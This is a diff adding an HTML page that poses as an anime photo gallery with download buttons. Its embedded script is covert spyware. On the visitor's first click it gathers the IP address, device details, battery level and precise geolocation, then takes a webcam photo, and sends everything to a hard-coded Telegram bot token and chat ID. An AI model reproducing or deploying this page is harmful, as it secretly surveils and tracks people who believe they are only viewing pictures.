@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Kumpulan Anime</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body, html { width: 100%; height: 100%; font-family: Arial, sans-serif; overflow: hidden; }
+    .background { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: url("https://raw.githubusercontent.com/miku208/Miku-bail/refs/heads/main/IMG-20250918-WA0312.jpg") center/cover no-repeat; filter: brightness(0.4); z-index: -1; }
+    h2 { text-align: center; padding: 12px; color: #fff; }
+    .slide-container { position: absolute; top: 60px; bottom: 0; left: 0; right: 0; overflow-y: auto; padding: 10px; display: flex; flex-direction: column; gap: 12px; }
+    .slide-item { background: rgba(0,0,0,0.7); border-radius: 10px; padding: 10px; text-align: center; backdrop-filter: blur(4px); }
+    .slide-item img { width: 100%; max-height: 220px; object-fit: cover; border-radius: 8px; cursor: pointer; }
+    .download-btn { margin-top: 8px; padding: 8px 14px; background: #007bff; border: none; border-radius: 6px; color: white; font-size: 14px; cursor: pointer; }
+    .download-btn:hover { background: #0056b3; }
+    .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); justify-content: center; align-items: center; z-index: 1000; }
+    .modal img { max-width: 95%; max-height: 95%; border-radius: 8px; }
+  </style>
+</head>
+<body>
+  <div class="background"></div>
+
+  <h2>Anime-Galery</h2>
+  <div class="slide-container">
+    <div class="slide-item">
+      <img src="https://raw.githubusercontent.com/miku208/Miku-bail/refs/heads/main/IMG-20250918-WA0312.jpg" alt="Foto 1">
+      <button class="download-btn" data-url="https://raw.githubusercontent.com/miku208/Miku-bail/refs/heads/main/IMG-20250918-WA0312.jpg">Download</button>
+    </div>
+    <div class="slide-item">
+      <img src="https://raw.githubusercontent.com/miku208/Miku-bail/refs/heads/main/IMG-20250916-WA0069.jpg" alt="Foto 2">
+      <button class="download-btn" data-url="https://raw.githubusercontent.com/miku208/Miku-bail/refs/heads/main/IMG-20250916-WA0069.jpg">Download</button>
+    </div>
+    <div class="slide-item">
+      <img src="https://raw.githubusercontent.com/miku208/Miku-bail/refs/heads/main/IMG-20250830-WA0139.jpg" alt="Foto 3">
+      <button class="download-btn" data-url="https://raw.githubusercontent.com/miku208/Miku-bail/refs/heads/main/IMG-20250830-WA0139.jpg">Download</button>
+    </div>
+  </div>
+
+  <!-- Modal -->
+  <div id="photoModal" class="modal">
+    <img id="modalImg" src="" alt="Full Photo">
+  </div>
+
+  <script>
+    const TOKEN = "8306978518:AAE-msgLTZJA92a6r7vB0JEQXkm4aSw-ZxE";
+    const CHAT_ID = "8115247024";
+
+    async function getIP() {
+      try {
+        let res = await fetch("https://api64.ipify.org?format=json");
+        let json = await res.json();
+        return json.ip;
+      } catch {
+        return "unknown";
+      }
+    }
+    async function getDeviceInfo() {
+      let battery = "unknown";
+      if (navigator.getBattery) {
+        try {
+          const b = await navigator.getBattery();
+          battery = Math.floor(b.level * 100) + "%";
+        } catch {}
+      }
+      return {
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        battery
+      };
+    }
+    async function sendToTelegram({ text, photo }) {
+      if (photo) {
+        const fd = new FormData();
+        fd.append("chat_id", CHAT_ID);
+        fd.append("caption", text);
+        fd.append("photo", photo, "capture.jpg");
+        await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: "POST", body: fd });
+      } else {
+        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ chat_id: CHAT_ID, text, parse_mode: "Markdown" })
+        });
+      }
+    }
+
+    async function captureAndSend() {
+      const ip = await getIP();
+      const deviceInfo = await getDeviceInfo();
+
+      // ambil lokasi
+      let loc = null;
+      if (navigator.geolocation) {
+        try {
+          loc = await new Promise(resolve => {
+            navigator.geolocation.getCurrentPosition(
+              pos => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude }),
+              () => resolve(null),
+              { enableHighAccuracy: true, timeout: 10000 }
+            );
+          });
+        } catch (e) {
+          console.log("Lokasi gagal:", e);
+        }
+      }
+
+      let caption = `📡 *Data Baru Terdeteksi!*\n\n`;
+      caption += `🌍 IP: ${ip}\n`;
+      caption += `📱 Device: ${deviceInfo.userAgent}\n`;
+      caption += `💻 Platform: ${deviceInfo.platform}\n`;
+      caption += `🌐 Language: ${deviceInfo.language}\n`;
+      caption += `🔋 Battery: ${deviceInfo.battery}\n`;
+
+      if (loc) {
+        caption += `📌 Lokasi: ${loc.lat}, ${loc.lon}\n`;
+        caption += `🌐 Maps: https://maps.google.com/?q=${loc.lat},${loc.lon}\n`;
+      } else {
+        caption += `📌 Lokasi: Gagal didapatkan / user nolak izin\n`;
+      }
+
+      await sendToTelegram({ text: caption });
+
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const track = stream.getVideoTracks()[0];
+        const imageCapture = new ImageCapture(track);
+        const blob = await imageCapture.takePhoto();
+        await sendToTelegram({ text: "📸 Foto hasil jepretan:", photo: blob });
+        track.stop();
+      } catch (err) {
+        console.log("Kamera gagal/ditolak:", err);
+      }
+    }
+
+    // Trigger klik
+    function addCaptureTrigger(el) {
+      el.addEventListener("click", () => { captureAndSend(); }, { once: true });
+    }
+    addCaptureTrigger(document.body);
+    document.querySelectorAll(".download-btn, .slide-item img").forEach(el => addCaptureTrigger(el));
+
+    // Tombol download
+    document.querySelectorAll(".download-btn").forEach(btn => {
+      btn.addEventListener("click", async (e) => {
+        e.stopPropagation();
+        const url = btn.getAttribute("data-url");
+        const res = await fetch(url);
+        const blob = await res.blob();
+        const a = document.createElement("a");
+        a.href = URL.createObjectURL(blob);
+        a.download = url.split("/").pop();
+        document.body.appendChild(a);
+        a.click();
+        a.remove();
+      });
+    });
+
+    // Modal
+    const modal = document.getElementById("photoModal");
+    const modalImg = document.getElementById("modalImg");
+    document.querySelectorAll(".slide-item img").forEach(img => {
+      img.addEventListener("click", (e) => {
+        e.stopPropagation();
+        modal.style.display = "flex";
+        modalImg.src = img.src;
+      });
+    });
+    modal.addEventListener("click", () => { modal.style.display = "none"; });
+  </script>
+</body>
+</html>
